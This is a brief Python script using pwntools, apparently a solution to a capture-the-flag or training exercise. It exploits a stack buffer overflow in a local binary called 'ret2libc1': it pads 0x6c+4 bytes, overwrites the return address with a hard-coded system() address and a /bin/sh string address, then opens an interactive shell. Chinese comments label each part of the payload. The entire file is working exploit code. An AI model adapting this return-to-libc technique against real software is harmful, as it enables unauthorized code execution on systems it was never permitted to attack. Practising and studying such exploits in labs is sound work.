#!/usr/bin/python3
from pwn import *

system_addr = 0x08048460
bin_sh_addr = 0x08048720

# 填充数据 offset=0x6c+4
# system函数地址
# 填充数据 4Bytes 虚假的返回地址
# /bin/sh字符串地址
payload = ((0x6c + 4) * b'A' + 
           p32(system_addr) + 
           4 * b'B' + 
           p32(bin_sh_addr))

sh = process('./ret2libc1')
sh.sendline(payload)
sh.interactive()

